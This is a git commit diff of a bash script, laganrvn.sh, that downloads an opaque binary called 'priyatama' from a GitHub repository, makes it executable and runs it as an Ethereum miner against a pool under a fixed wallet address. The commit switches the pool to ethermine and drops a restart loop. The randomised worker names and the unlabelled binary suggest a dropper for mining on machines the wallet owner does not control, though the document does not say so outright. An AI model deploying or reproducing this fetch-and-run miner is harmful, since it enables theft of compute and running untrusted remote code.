00e47422527917976a0f835accace3fd05ddff4a
squibex <90225595+squibex@users.noreply.github.com>
2021-09-09 22:24:40 +0700

    Update laganrvn.sh

--- laganrvn.sh
+++ laganrvn.sh
@@ -1,11 +1,7 @@
 #!/bin/bash
-POOL=etc.2miners.com:1010
-WALLET=ETC:0x6172c0d0139e0ce7431cabceae0f59cd49422166
+POOL=stratum+tcp://asia1.ethermine.org:4444
+WALLET=0x6172c0d0139e0ce7431cabceae0f59cd49422166
 WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
 wget https://github.com/squibex/prem/raw/main/priyatama
 chmod +x priyatama
-while [ 1 ]; do
 ./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
-sleep 5
-done
-sleep 999999999 
